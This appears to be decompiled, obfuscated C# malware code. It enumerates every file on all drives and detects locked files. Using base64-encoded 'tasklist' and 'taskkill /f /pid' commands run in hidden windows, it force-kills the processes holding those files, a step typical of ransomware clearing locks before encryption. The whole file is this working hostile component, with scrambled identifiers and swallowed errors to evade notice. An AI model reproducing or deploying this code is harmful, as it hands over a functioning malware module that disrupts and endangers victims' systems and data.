using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace nLpTFjJRwUBp;

internal class WZhpvictZiGEM
{
	[CompilerGenerated]
	private sealed class dhRCJkMlSntD
	{
		public string XwPIaSYuXmqP;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(XwPIaSYuXmqP);
		}
	}

	public static readonly List<string> NeVNnaezaYh = new List<string>();

	public static readonly List<string> EGuWjNBRzvDQL = new List<string>();

	public static void HqAyZATwQZE()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					jqpbyKOVajx(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void jqpbyKOVajx(string RFwyKFSKVEuoNyh)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(RFwyKFSKVEuoNyh);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					NeVNnaezaYh.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					jqpbyKOVajx(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (NeVNnaezaYh.Count <= 0)
		{
			return;
		}
		foreach (string item in NeVNnaezaYh.Where((string YcrgttmbDfZgI) => ZHMKrLAFScGR(YcrgttmbDfZgI)))
		{
			EGuWjNBRzvDQL.Add(item);
		}
		NeVNnaezaYh.Clear();
		if (EGuWjNBRzvDQL.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in EGuWjNBRzvDQL.Select((string fooQGsPOyEMy) => new FileInfo(fooQGsPOyEMy)))
		{
			xXyRUeNTcwhWhzK(item2.Name);
		}
	}

	public static bool ZHMKrLAFScGR(string roqyHEfnMYDb)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(roqyHEfnMYDb, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(roqyHEfnMYDb, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void xXyRUeNTcwhWhzK(string BttDKaCvvQTq)
	{
		try
		{
			string text = HROZkDcEasKQFB(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("dGFza2xpc3Q="), RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(BttDKaCvvQTq)
				select t into GhIArahnZQvn
				select GhIArahnZQvn.Split(new char[1] { ',' }) into pyRJFXOuXgKp
				select pyRJFXOuXgKp[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				HROZkDcEasKQFB(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("dGFza2tpbGw="), RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string HROZkDcEasKQFB(string qVAdzzekoWOdB, string nEIKRKamMHw)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(qVAdzzekoWOdB, nEIKRKamMHw);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
